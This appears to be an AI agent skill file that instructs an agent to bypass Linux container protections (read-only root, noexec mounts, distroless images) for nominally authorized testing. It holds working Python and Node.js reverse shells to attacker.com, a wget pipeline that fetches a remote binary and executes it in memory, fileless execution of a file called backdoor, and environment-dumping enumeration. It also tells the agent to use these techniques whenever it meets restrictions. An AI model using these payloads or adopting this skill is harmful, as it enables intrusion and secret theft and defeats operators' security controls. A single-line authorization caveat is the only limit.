---
name: bypass-fs-protections
description: Bypass Linux filesystem protections (read-only, no-exec, distroless containers) for authorized security testing. Use this skill whenever you need to execute code on restricted Linux systems, containers with readOnlyRootFilesystem, distroless containers, or when facing no-exec mount restrictions. Make sure to use this skill when you encounter read-only filesystems, no-exec protections, or minimal containers where standard binary execution fails.
---

# Bypass Linux Filesystem Protections

This skill helps you execute code on Linux systems with filesystem restrictions commonly found in containers and hardened environments.

## When to Use This Skill

- Container has `readOnlyRootFilesystem: true`
- Filesystem mounted with `noexec` flag
- Working in distroless/minimal containers
- Need to execute binaries that aren't on the system
- Standard `./binary` execution fails with "Permission denied" or "Operation not permitted"

## Understanding the Protections

### Read-Only Filesystem
Containers often mount with `readOnlyRootFilesystem: true`. While `/` is read-only, `/dev/shm` remains writable but is mounted with `noexec`.

### No-Exec Protection
Even if you can write to `/dev/shm`, you cannot execute binaries from there due to the `noexec` mount flag.

### Distroless Containers
Contain only runtime dependencies, no shell, no package manager, no common utilities like `ls`, `whoami`, `id`.

## Technique 1: Script-Based Execution (Easiest)

If the interpreter exists on the system, you can execute scripts even with no-exec:

```bash
# Shell script (if sh/bash exists)
echo '#!/bin/sh
whoami
id' | sh

# Python script (if python exists)
python3 -c "import os; os.system('id')"

# Perl script (if perl exists)
perl -e 'system("id")'
```

**Limitation**: Cannot execute compiled binaries this way.

## Technique 2: Fileless ELF Execution (Python/Perl/Ruby)

Use [fileless-elf-exec](https://github.com/nnsee/fileless-elf-exec) to execute binaries from memory using `create_memfd` syscall.

### How it works:
1. Binary is compressed and base64 encoded into a script
2. Script creates a memory file descriptor via `create_memfd` syscall
3. Binary is decoded/decompressed into the memory fd
4. `exec` syscall runs the binary from the fd

### Usage:
```bash
# Generate a Python script from a binary
python3 fileless-elf-exec.py -b /path/to/binary -l python -o run_binary.py

# Execute the generated script
python3 run_binary.py
```

**Supported languages**: Python, Perl, Ruby (languages that can call raw syscalls)

**Not supported**: PHP, Node.js (no default syscall access)

## Technique 3: DDexec / EverythingExec

[DDexec](https://github.com/arget13/DDexec) modifies your own process memory via `/proc/self/mem` to execute arbitrary code.

### How it works:
1. Downloads binary as base64
2. Writes shellcode to `/proc/self/mem`
3. Mutates the current process to execute the code

### Basic usage:
```bash
# Execute a binary from URL
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar

# Execute local binary
cat binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```

### Advantages:
- Can load and execute any binary from memory
- Can execute shellcode directly
- Works even with no-exec protections

## Technique 4: MemExec (Daemonized DDexec)

[MemExec](https://github.com/arget13/memexec) is a daemonized version of DDexec. Once running, you can pass multiple binaries to execute without relaunching.

### Usage:
1. First, establish DDexec to run the memexec daemon
2. Communicate with the daemon to load new binaries
3. Each binary is loaded and executed from memory

See [memexec PHP example](https://github.com/arget13/memexec/blob/main/a.php) for reverse shell integration.

## Technique 5: Memdlopen

[Memdlopen](https://github.com/arget13/memdlopen) provides an easier way to load binaries in memory, including those with dependencies.

### Advantages:
- Simpler than DDexec for some use cases
- Can handle binaries with shared library dependencies
- Memory-based execution bypasses filesystem protections

## Distroless Container Techniques

### Getting Initial Access

In distroless containers, you may not have `sh`, `bash`, or common utilities. Use the runtime language:

```python
# Python reverse shell (if Python is available)
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('attacker.com',4444))
for cmd in iter(lambda:s.recv(1024).decode(),''):
    s.send(subprocess.check_output(cmd,shell=True))
```

```javascript
// Node.js reverse shell (if Node is available)
var net = require('net');
var sh = require('child_process').execSync;
var client = new net.Socket();
client.connect(4444, 'attacker.com', function() {
    client.on('data', function(data) {
        sh(data, function(err, stdout, stderr) {
            client.write(stdout + stderr);
        });
    });
});
```

### Enumerating Without Shell

Use the scripting language to enumerate:

```python
# Python enumeration
import os, socket, platform
print(f"Hostname: {socket.gethostname()}")
print(f"User: {os.getlogin()}")
print(f"UID: {os.getuid()}")
print(f"Platform: {platform.platform()}")
print(f"Env: {os.environ}")
```

### Combining Techniques

1. Get reverse shell via scripting language
2. Use memory execution techniques to run binaries
3. Use fileless-elf-exec or DDexec for tools like `kubectl`, `nmap`, etc.

## Practical Workflow

### Scenario: Container with readOnlyRootFilesystem + noexec

```bash
# 1. Check what's available
python3 -c "import os; print(os.listdir('/'))"

# 2. If Python exists, use fileless-elf-exec
# Download the tool and generate script
wget -O fileless-elf-exec.py https://raw.githubusercontent.com/nnsee/fileless-elf-exec/main/fileless-elf-exec.py
python3 fileless-elf-exec.py -b /tmp/backdoor -l python -o run_backdoor.py

# 3. Execute from memory
python3 run_backdoor.py
```

### Scenario: Distroless container with Flask app

```python
# 1. Get Python reverse shell
# (Use the Python reverse shell code above)

# 2. Once you have shell, enumerate
python3 -c "import os; print(os.environ)"

# 3. Use memory execution for additional tools
# Download and use fileless-elf-exec or DDexec
```

## Tools Reference

| Tool | Purpose | Language Support |
|------|---------|------------------|
| fileless-elf-exec | Execute ELF from memory fd | Python, Perl, Ruby |
| DDexec | Process memory mutation | Any (bash wrapper) |
| MemExec | Daemonized DDexec | Any |
| Memdlopen | Load binaries with deps | Any |

## Important Notes

- **Authorization**: Only use these techniques on systems you own or have explicit permission to test
- **Detection**: Memory-based execution may be detected by EDR solutions
- **Persistence**: Memory execution is volatile - binaries disappear on process exit
- **Dependencies**: Some techniques require specific syscalls or kernel features

## Videos for Deep Dive

- [DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion](https://www.youtube.com/watch?v=poHirez8jk4)
- [Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023](https://www.youtube.com/watch?v=VM_gjjiARaU)
